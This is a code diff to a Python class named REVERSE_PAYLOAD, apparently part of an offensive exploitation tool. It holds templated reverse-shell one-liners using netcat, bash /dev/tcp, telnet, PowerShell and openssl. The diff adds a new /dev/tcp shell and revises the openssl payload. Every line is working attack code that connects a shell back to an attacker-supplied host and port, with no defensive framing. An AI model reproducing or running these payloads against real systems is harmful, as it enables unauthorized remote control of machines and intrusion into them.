@@ -334,6 +334,7 @@ class REVERSE_PAYLOAD:
     NC = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f"""
     NC2 = """nc -e /bin/sh {0} {1}"""
     NC3 = """rm -f /tmp/p;mknod /tmp/p p && nc {0} {1} 0/tmp/p"""
+    BASH0 = """sh -i >& /dev/tcp/{0}/{1} 0>&1"""
     BASH = """bash -c 'sh -i >& /dev/tcp/{0}/{1} 0>&1'"""
     BASH2 = """bash -c 'sh -i &gt;&amp; /dev/tcp/{0}/{1} 0&gt;&amp;1'"""
     TELNET = """rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p"""
@@ -364,7 +365,8 @@ class REVERSE_PAYLOAD:
         '''$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
     )
     OPENSSL = (
-        'rm -rf /tmp/s;mkfifo /tmp/s;/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {0}:{1}>/tmp/s;'
+        'rm -rf /tmp/s;mkfifo /tmp/s||mknod /tmp/s p;'
+        '/bin/sh -i </tmp/s 2>&1|openssl s_client -quiet -connect {0}:{1}>/tmp/s;'
         'rm -rf /tmp/s'
     )
 
